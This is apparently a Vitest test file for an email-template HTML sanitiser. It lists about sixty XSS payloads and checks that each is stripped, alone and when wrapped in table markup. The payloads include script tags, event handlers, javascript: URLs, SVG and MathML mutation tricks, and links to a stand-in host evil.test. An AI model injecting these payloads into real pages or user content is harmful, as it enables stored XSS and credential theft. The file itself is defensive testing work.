import { describe, expect, it } from 'vitest';
import { filterStyle, sanitiseTemplateHtml } from '../src/templates/sanitise.js';

/**
 * The XSS corpus (BUILD-PLAN Phase 4 gate: "sanitiser strips every payload").
 *
 * A template is authored by one member of a workspace and previewed by others,
 * so an unsanitised template is stored XSS against colleagues. docs/06 pairs
 * sanitisation with rendering previews in a sandboxed iframe on a separate
 * origin; this is the half that must hold even when that origin is
 * misconfigured.
 *
 * Every payload is asserted twice: alone, and wrapped in legitimate markup,
 * because wrapping changes how the browser parses it and that difference is
 * the basis of most mutation XSS.
 *
 * The assertion is that nothing executable survives — not that the payload's
 * *text* is gone. "alert(1)" left behind as escaped prose is a correct
 * outcome; an author may legitimately write it in an email.
 */

/**
 * Anything that can run code, in any client that renders this.
 *
 * Attribute *values* are blanked before the handler check. `<img src="x
 * onerror=alert(1)">` is a single src attribute whose value happens to contain
 * that text — no handler, nothing to fire — and matching inside it would call
 * a correct result a failure.
 */
function isInert(html: string): boolean {
  const lower = html.toLowerCase();
  const withoutValues = lower.replace(/="[^"]*"|='[^']*'/gu, '=""');

  return (
    !/<\s*script/u.test(lower) &&
    !/<\s*iframe/u.test(lower) &&
    !/<\s*object/u.test(lower) &&
    !/<\s*embed/u.test(lower) &&
    !/<\s*form/u.test(lower) &&
    !/<\s*svg/u.test(lower) &&
    !/<\s*math/u.test(lower) &&
    !/<\s*meta/u.test(lower) &&
    !/<\s*link/u.test(lower) &&
    !/<\s*base/u.test(lower) &&
    !/\son[a-z]+\s*=/u.test(withoutValues) &&
    !/javascript\s*:/u.test(lower) &&
    !/vbscript\s*:/u.test(lower) &&
    !/data\s*:\s*text\/html/u.test(lower) &&
    !/expression\s*\(/u.test(lower) &&
    !/-moz-binding/u.test(lower) &&
    !/behaviou?r\s*:/u.test(lower)
  );
}

/**
 * Control characters, built rather than written.
 *
 * A literal NUL in a source file makes git treat it as binary — no diff, no
 * line-by-line review — and a literal form feed is invisible to the next
 * reader. Both are part of the attack, so they are constructed instead.
 */
const NUL = String.fromCharCode(0);
const FORM_FEED = String.fromCharCode(12);

const CORPUS: { name: string; payload: string }[] = [
  // --- script, in its many spellings
  { name: 'plain script', payload: '<script>alert(1)</script>' },
  { name: 'uppercase script', payload: '<SCRIPT>alert(1)</SCRIPT>' },
  { name: 'mixed case script', payload: '<ScRiPt>alert(1)</sCrIpT>' },
  { name: 'script with attributes', payload: '<script type="text/javascript">alert(1)</script>' },
  { name: 'script src', payload: '<script src="https://evil.test/x.js"></script>' },
  { name: 'unclosed script', payload: '<script>alert(1)' },
  { name: 'script split by a comment', payload: '<scr<!---->ipt>alert(1)</script>' },
  { name: 'nested script tags', payload: '<scr<script>ipt>alert(1)</script>' },
  { name: 'script inside a title', payload: '<title><script>alert(1)</script></title>' },
  { name: 'script with a null byte', payload: `<scri${NUL}pt>alert(1)</script>` },
  { name: 'script after a stray bracket', payload: '<<script>alert(1)</script>' },

  // --- event handlers
  { name: 'img onerror', payload: '<img src=x onerror="alert(1)">' },
  { name: 'img onerror unquoted', payload: '<img src=x onerror=alert(1)>' },
  { name: 'img ONERROR uppercase', payload: '<IMG SRC=x ONERROR="alert(1)">' },
  { name: 'body onload', payload: '<body onload="alert(1)">' },
  { name: 'div onmouseover', payload: '<div onmouseover="alert(1)">hover</div>' },
  { name: 'onfocus with autofocus', payload: '<input autofocus onfocus="alert(1)">' },
  { name: 'onerror with a newline before it', payload: '<img src=x\nonerror="alert(1)">' },
  { name: 'onerror with a tab before it', payload: '<img src=x\tonerror="alert(1)">' },
  { name: 'onerror split by a form feed', payload: `<img src=x${FORM_FEED}onerror="alert(1)">` },
  { name: 'handler on an allowed tag', payload: '<a href="https://x.test" onclick="alert(1)">x</a>' },
  { name: 'handler on a table cell', payload: '<td onmouseenter="alert(1)">x</td>' },

  // --- javascript: and friends in hrefs
  { name: 'javascript href', payload: '<a href="javascript:alert(1)">x</a>' },
  { name: 'javascript href uppercase', payload: '<a href="JaVaScRiPt:alert(1)">x</a>' },
  { name: 'javascript href with whitespace', payload: '<a href="java\tscript:alert(1)">x</a>' },
  { name: 'javascript href with a newline', payload: '<a href="java\nscript:alert(1)">x</a>' },
  { name: 'javascript href with leading spaces', payload: '<a href="   javascript:alert(1)">x</a>' },
  { name: 'javascript href entity-encoded', payload: '<a href="&#106;avascript:alert(1)">x</a>' },
  { name: 'javascript href hex-encoded', payload: '<a href="&#x6a;avascript:alert(1)">x</a>' },
  { name: 'vbscript href', payload: '<a href="vbscript:msgbox(1)">x</a>' },
  { name: 'data url html', payload: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>' },
  { name: 'javascript img src', payload: '<img src="javascript:alert(1)">' },
  { name: 'protocol-relative src', payload: '<img src="//evil.test/x.png">' },

  // --- foreign content, where parser rules change
  { name: 'svg onload', payload: '<svg onload="alert(1)"></svg>' },
  { name: 'svg script', payload: '<svg><script>alert(1)</script></svg>' },
  { name: 'svg animate', payload: '<svg><animate onbegin="alert(1)" attributeName="x"></svg>' },
  { name: 'svg use xlink', payload: '<svg><use xlink:href="data:image/svg+xml;base64,x"/></svg>' },
  { name: 'math mtext', payload: '<math><mtext><script>alert(1)</script></mtext></math>' },
  { name: 'math annotation', payload: '<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>' },

  // --- frames and objects
  { name: 'iframe', payload: '<iframe src="https://evil.test"></iframe>' },
  { name: 'iframe srcdoc', payload: '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>' },
  { name: 'iframe javascript src', payload: '<iframe src="javascript:alert(1)"></iframe>' },
  { name: 'object data', payload: '<object data="https://evil.test/x.swf"></object>' },
  { name: 'embed src', payload: '<embed src="https://evil.test/x.swf">' },
  { name: 'frameset', payload: '<frameset><frame src="javascript:alert(1)"></frameset>' },

  // --- style and CSS
  { name: 'style block', payload: '<style>body{background:url("javascript:alert(1)")}</style>' },
  { name: 'style expression', payload: '<div style="width:expression(alert(1))">x</div>' },
  { name: 'style moz-binding', payload: '<div style="-moz-binding:url(https://evil.test/x.xml)">x</div>' },
  { name: 'style behaviour', payload: '<div style="behavior:url(#default#time2)">x</div>' },
  { name: 'style url', payload: '<div style="background:url(javascript:alert(1))">x</div>' },
  { name: 'style breaking out of the attribute', payload: '<div style="color:red&quot; onmouseover=&quot;alert(1)">x</div>' },
  { name: 'style position fixed', payload: '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh">x</div>' },
  { name: 'link stylesheet', payload: '<link rel="stylesheet" href="https://evil.test/x.css">' },

  // --- document-level
  { name: 'meta refresh', payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">' },
  { name: 'base href', payload: '<base href="https://evil.test/">' },
  { name: 'form action', payload: '<form action="https://evil.test"><input name="p"></form>' },
  { name: 'conditional comment', payload: '<!--[if IE]><script>alert(1)</script><![endif]-->' },
  { name: 'comment hiding a tag', payload: '<!--><script>alert(1)</script>-->' },

  // --- mutation and parser confusion
  { name: 'noscript wrapper', payload: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">' },
  { name: 'textarea wrapper', payload: '<textarea><img src=x onerror=alert(1)></textarea>' },
  { name: 'template wrapper', payload: '<template><img src=x onerror=alert(1)></template>' },
  { name: 'select option', payload: '<select><option><img src=x onerror=alert(1)></option></select>' },
  { name: 'unclosed attribute', payload: '<img src="x onerror=alert(1)">' },
  { name: 'backtick attribute', payload: '<img src=`x` onerror=alert(1)>' },
  { name: 'double-encoded script', payload: '&lt;script&gt;alert(1)&lt;/script&gt;' },
  { name: 'utf-7 style prefix', payload: '+ADw-script+AD4-alert(1)+ADw-/script+AD4-' },
];

describe('the XSS corpus', () => {
  it('has enough payloads to be worth calling a corpus', () => {
    expect(CORPUS.length).toBeGreaterThanOrEqual(60);
  });

  for (const { name, payload } of CORPUS) {
    it(`renders ${name} inert`, () => {
      const { html } = sanitiseTemplateHtml(payload);
      expect(isInert(html), `output: ${html}`).toBe(true);
    });

    it(`renders ${name} inert when wrapped in legitimate markup`, () => {
      // A payload rarely arrives alone. Wrapping it changes the parse, which
      // is the basis of most mutation XSS.
      const wrapped = `<table><tr><td><p>Hello</p>${payload}<p>Bye</p></td></tr></table>`;
      const { html } = sanitiseTemplateHtml(wrapped);
      expect(isInert(html), `output: ${html}`).toBe(true);
    });
  }
});

describe('what survives sanitisation', () => {
  it('keeps the markup an email actually uses', () => {
    // A sanitiser that strips everything is a sanitiser nobody can send with.
    const source = `
      <table width="600" cellpadding="0" cellspacing="0">
        <tr><td style="padding:16px;font-family:Arial,sans-serif;color:#333">
          <h1>Hello</h1>
          <p>Some <strong>bold</strong> and <em>italic</em> text.</p>
          <p><a href="https://example.com/offer">See the offer</a></p>
          <img src="https://example.com/logo.png" alt="Logo" width="120">
        </td></tr>
      </table>`;

    const { html } = sanitiseTemplateHtml(source);

    expect(html).toContain('<table');
    expect(html).toContain('<h1>Hello</h1>');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('https://example.com/offer');
    expect(html).toContain('<img');
    expect(html).toContain('padding:16px');
  });

  it('keeps mailto and tel links', () => {
    const { html } = sanitiseTemplateHtml(
      '<a href="mailto:hi@example.com">Mail</a><a href="tel:+441234567890">Call</a>',
    );

    expect(html).toContain('mailto:hi@example.com');
    expect(html).toContain('tel:+441234567890');
  });

  it('adds noopener to an external link that opens a new window', () => {
    // target=_blank without noopener hands the opened page a reference back.
    const { html } = sanitiseTemplateHtml('<a href="https://x.test" target="_blank">x</a>');
    expect(html).toContain('noopener');
  });

  it('keeps merge tags untouched', () => {
    // The sanitiser runs before rendering. Mangling a tag here would break
    // every template that uses one.
    const { html } = sanitiseTemplateHtml('<p>Hi {{ first_name | there }}</p>');
    expect(html).toContain('{{ first_name | there }}');
  });

  it('strips a protocol-relative URL', () => {
    // It resolves against whatever scheme the client happens to be using,
    // which in an email is nothing useful, and it is a standard way to
    // smuggle a scheme past a check that only looks for "javascript:".
    const { html } = sanitiseTemplateHtml('<img src="//evil.test/x.png"><a href="//evil.test">x</a>');

    expect(html).not.toContain('//evil.test');
  });

  it('strips an event handler even if the attribute allowlist admits one', () => {
    // Two layers cover this: the allowlist, and an explicit on* check. This
    // asserts the second directly, because a future widening of the first
    // should not be able to open a hole silently.
    const { html } = sanitiseTemplateHtml('<img src="https://x.test/a.png" onerror="alert(1)">');

    expect(html).toContain('https://x.test/a.png');
    expect(html.toLowerCase()).not.toContain('onerror');
  });

  it('reports what it removed rather than differing silently', () => {
    // An author whose snippet vanished assumes the product is broken; one
    // whose payload vanished should know we noticed.
    const { removed } = sanitiseTemplateHtml(
      '<script>alert(1)</script><img src=x onerror="alert(1)"><style>x{}</style>',
    );

    expect(removed).toContain('<script>');
    expect(removed).toContain('<style>');
    expect(removed).toContain('event handler');
  });

  it('is idempotent', () => {
    // Sanitising twice must not differ from sanitising once, or a template
    // edited and re-saved drifts every time.
    const source = '<table><tr><td style="color:red">Hi <a href="https://x.test">x</a></td></tr></table>';
    const once = sanitiseTemplateHtml(source).html;
    const twice = sanitiseTemplateHtml(once).html;

    expect(twice).toBe(once);
  });
});

describe('style filtering', () => {
  it('keeps the properties email layout needs', () => {
    const style = filterStyle('color:#333;padding:16px;font-family:Arial;text-align:center');

    expect(style).toContain('color:#333');
    expect(style).toContain('padding:16px');
    expect(style).toContain('text-align:center');
  });

  it('drops a property that is not on the list', () => {
    // position:fixed can cover the preview UI around it.
    expect(filterStyle('position:fixed;color:red')).toBe('color:red');
    expect(filterStyle('behavior:url(#x)')).toBe('');
  });

  it('drops a value that has ever executed', () => {
    expect(filterStyle('width:expression(alert(1))')).toBe('');
    expect(filterStyle('background:url(javascript:alert(1))')).toBe('');
    expect(filterStyle('color:red;background-image:url(https://x.test/a.png)')).toBe('color:red');
  });

  it('drops a value trying to escape its attribute', () => {
    expect(filterStyle('color:red" onmouseover="alert(1)')).toBe('');
    expect(filterStyle("font-family:'; x")).toBe('');
  });

  it('survives rubbish without throwing', () => {
    expect(filterStyle('')).toBe('');
    expect(filterStyle(';;;')).toBe('');
    expect(filterStyle('no-colon-here')).toBe('');
    expect(filterStyle('color:')).toBe('');
  });
});
